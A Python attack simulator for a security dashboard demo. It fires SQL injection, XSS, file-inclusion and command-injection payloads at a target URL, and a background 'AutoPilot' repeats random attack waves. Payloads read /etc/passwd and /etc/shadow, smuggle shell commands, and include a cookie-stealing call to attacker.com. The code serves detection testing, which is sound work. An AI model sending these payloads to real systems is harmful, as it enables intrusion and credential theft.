"""
AutoShield - Attack Simulator
Fires real HTTP requests with malicious payloads to a target server.
Use against YOUR OWN local test server ONLY.
Default target: http://localhost:8080 (spin up with: python -m http.server 8080)
"""

import requests
import time
import argparse
import sys
import json
import os
import uuid
import logging
from datetime import datetime
from urllib.parse import quote

TARGET = "http://localhost:8080"
EVENT_STREAM_FILE = os.getenv(
    "AUTOSHIELD_EVENT_STREAM", "/tmp/autoshield_event_stream.jsonl"
)

# ─── Payload Bank ─────────────────────────────────────────────────────────────

PAYLOADS = {
    "SQLi": [
        "/login?user=' OR '1'='1'--&pass=anything",
        "/products?id=1 UNION SELECT username,password FROM users--",
        "/search?q=1' AND SLEEP(5)--",
        "/api/user?id=1; DROP TABLE sessions--",
    ],
    "XSS": [
        "/search?q=<script>alert(document.cookie)</script>",
        "/profile?name=<img src=x onerror=alert('XSS')>",
        '/comment?text=<svg onload=fetch("https://attacker.com/?c="+document.cookie)>',
        "/page?title=<iframe src=javascript:alert('xss')>",
    ],
    "LFI": [
        "/page?file=../../../../etc/passwd",
        "/download?path=../../../etc/shadow",
        "/view?template=php://filter/convert.base64-encode/resource=/etc/passwd",
        "/load?module=../../../../proc/self/environ",
    ],
    "CMDi": [
        "/ping?host=8.8.8.8;cat /etc/passwd",
        "/lookup?domain=google.com|id",
        "/exec?cmd=ls -la;whoami",
        "/check?url=http://x.com`id`",
    ],
}

SEVERITY = {
    "SQLi": "CRITICAL",
    "XSS": "HIGH",
    "LFI": "CRITICAL",
    "CMDi": "CRITICAL",
}

COLORS = {
    "CRITICAL": "\033[91m",  # red
    "HIGH": "\033[93m",  # yellow
    "INFO": "\033[94m",  # blue
    "GREEN": "\033[92m",
    "RESET": "\033[0m",
    "BOLD": "\033[1m",
}


def c(text, color):
    return f"{COLORS[color]}{text}{COLORS['RESET']}"


def _emit_event(
    attack_type: str,
    payload: str,
    status,
    target: str,
    source_ip: str,
    stream_file: str = EVENT_STREAM_FILE,
):
    severity = SEVERITY.get(attack_type, "HIGH")
    confidence = {"CRITICAL": 85, "HIGH": 70}.get(severity, 60)
    event = {
        "type": "attack_event",
        "event_id": f"sim-{str(uuid.uuid4().hex)[:10]}",
        "timestamp": datetime.now().isoformat(),
        "src_ip": source_ip,
        "attack_type": attack_type,
        "severity": severity,
        "payload": payload,
        "status": str(status),
        "target": target,
        "confidence": confidence,
        "detection_source": "simulator_cli",
    }
    try:
        with open(stream_file, "a", encoding="utf-8") as f:
            f.write(json.dumps(event) + "\n")
    except Exception:
        pass


# ─── Simulator ────────────────────────────────────────────────────────────────


def fire_attack(
    attack_type: str,
    target: str = TARGET,
    delay: float = 0.5,
    verbose: bool = True,
    emit_only: bool = False,
    stream_file: str = EVENT_STREAM_FILE,
):
    """Fire all payloads for given attack type."""
    payloads = PAYLOADS.get(attack_type, [])
    results = []

    sev = SEVERITY.get(attack_type, "HIGH")
    print(f"\n{c('━' * 50, 'BOLD')}")
    print(f"{c(f'  [{sev}] Launching {attack_type} attack', sev)}")
    print(f"{c('━' * 50, 'BOLD')}")

    for i, payload in enumerate(payloads, start=1):
        source_ip = f"203.0.113.{(list(PAYLOADS.keys()).index(attack_type) * 20) + i}"
        url = target.rstrip("/") + payload
        if emit_only:
            status = "EMITTED_ONLY"
        else:
            try:
                resp = requests.get(url, timeout=3, allow_redirects=False)
                status = resp.status_code
            except requests.exceptions.ConnectionError:
                status = "CONNECTION_REFUSED"
            except requests.exceptions.Timeout:
                status = "TIMEOUT"
            except Exception as e:
                status = f"ERROR:{e}"

        result = {
            "type": attack_type,
            "payload": payload,
            "status": status,
            "src_ip": source_ip,
        }
        results.append(result)

        _emit_event(
            attack_type=attack_type,
            payload=payload,
            status=status,
            target=target,
            source_ip=source_ip,
            stream_file=stream_file,
        )

        if verbose:
            print(f"  {c('→', 'INFO')} {payload[:60]}...")
            print(f"    HTTP {status}")
            print(f"    Streamed as {source_ip}")

        time.sleep(delay)

    return results


def run_full_demo(
    target: str = TARGET,
    delay: float = 1.0,
    emit_only: bool = False,
    stream_file: str = EVENT_STREAM_FILE,
):
    """
    Full demo sequence — fires all 4 attack types with pauses.
    This is your 3-minute hackathon demo.
    """
    print(f"\n{c('=' * 60, 'BOLD')}")
    print(f"{c('  🛡️  AutoShield Attack Simulator — DEMO MODE', 'BOLD')}")
    print(f"{c('=' * 60, 'BOLD')}")
    print(f"\n  {c('Target:', 'INFO')} {target}")
    print(f"  {c('Event stream:', 'INFO')} {stream_file}")
    print(f"  {c('⚠️  Only use against systems you own!', 'CRITICAL')}\n")

    all_results = {}
    for atype in ["SQLi", "XSS", "LFI", "CMDi"]:
        all_results[atype] = fire_attack(
            atype,
            target,
            delay=delay,
            emit_only=emit_only,
            stream_file=stream_file,
        )
        time.sleep(delay * 2)

    print(f"\n{c('=' * 60, 'BOLD')}")
    print(f"{c('  Demo complete. Check AutoShield dashboard.', 'GREEN')}")
    print(f"{c('=' * 60, 'BOLD')}\n")
    return all_results


def run_single_attack(
    attack_type: str,
    target: str = TARGET,
    emit_only: bool = False,
    stream_file: str = EVENT_STREAM_FILE,
):
    """Fire single attack type — for live dashboard demo."""
    if attack_type not in PAYLOADS:
        print(f"Unknown attack type: {attack_type}")
        print(f"Choose from: {list(PAYLOADS.keys())}")
        sys.exit(1)
    fire_attack(attack_type, target, emit_only=emit_only, stream_file=stream_file)


# ─── CLI ─────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="AutoShield Attack Simulator — for demo/testing only"
    )
    parser.add_argument(
        "--target", default=TARGET, help=f"Target URL (default: {TARGET})"
    )
    parser.add_argument(
        "--type",
        choices=["SQLi", "XSS", "LFI", "CMDi", "all"],
        default="all",
        help="Attack type to simulate",
    )
    parser.add_argument(
        "--delay", type=float, default=0.5, help="Delay between payloads in seconds"
    )
    parser.add_argument(
        "--emit-only",
        action="store_true",
        help="Do not send HTTP requests, only stream attack events",
    )
    parser.add_argument(
        "--stream-file",
        default=EVENT_STREAM_FILE,
        help=f"Path to JSONL event stream (default: {EVENT_STREAM_FILE})",
    )
    args = parser.parse_args()

    if args.type == "all":
        run_full_demo(
            target=args.target,
            delay=args.delay,
            emit_only=args.emit_only,
            stream_file=args.stream_file,
        )
    else:
        run_single_attack(
            args.type,
            target=args.target,
            emit_only=args.emit_only,
            stream_file=args.stream_file,
        )


# ─── Integrated Smart AutoPilot ───────────────────────────────────────────────

import random
import threading

class SmartAutoPilot:
    """
    Intelligent Assault Engine that simulates realistic multi-vector attacks.
    Runs in a background thread and can be controlled via API.
    """
    def __init__(self, target=TARGET, stream_file=EVENT_STREAM_FILE):
        self.target = target
        self.stream_file = stream_file
        self.running = False
        self._thread = None
        self.log = logging.getLogger("AutoShield.AutoPilot")

    def start(self):
        if self.running: return
        self.running = True
        thread = threading.Thread(target=self._assault_loop, daemon=True)
        self._thread = thread
        thread.start()
        self.log.info("Smart AutoPilot Engaged")

    def stop(self):
        self.running = False
        self.log.info("Smart AutoPilot Halted")

    def _assault_loop(self):
        while self.running:
            try:
                # Randomly pick an attack vector
                atype = random.choice(list(PAYLOADS.keys()))
                intensity = random.randint(1, 5) # how many payloads to fire
                
                self.log.info(f"AutoPilot: Launching {intensity}x {atype} vector...")
                
                payload_subset = random.sample(PAYLOADS[atype], min(intensity, len(PAYLOADS[atype])))
                
                for payload in payload_subset:
                    if not self.running: break
                    
                    source_ip = f"141.101.{random.randint(1, 254)}.{random.randint(1, 254)}"
                    url = self.target.rstrip("/") + payload
                    
                    try:
                        resp = requests.get(url, timeout=2, allow_redirects=False)
                        status = resp.status_code
                    except:
                        status = "NETWORK_ERR"
                        
                    _emit_event(
                        attack_type=atype,
                        payload=payload,
                        status=status,
                        target=self.target,
                        source_ip=source_ip,
                        stream_file=self.stream_file
                    )
                    
                    time.sleep(random.uniform(0.1, 1.5))
                
                # Wait between waves
                time.sleep(random.uniform(5, 15))
                
            except Exception as e:
                self.log.error(f"AutoPilot logic error: {e}")
                time.sleep(5)

_autopilot_instance = None

def get_autopilot():
    global _autopilot_instance
    if _autopilot_instance is None:
        _autopilot_instance = SmartAutoPilot()
    return _autopilot_instance
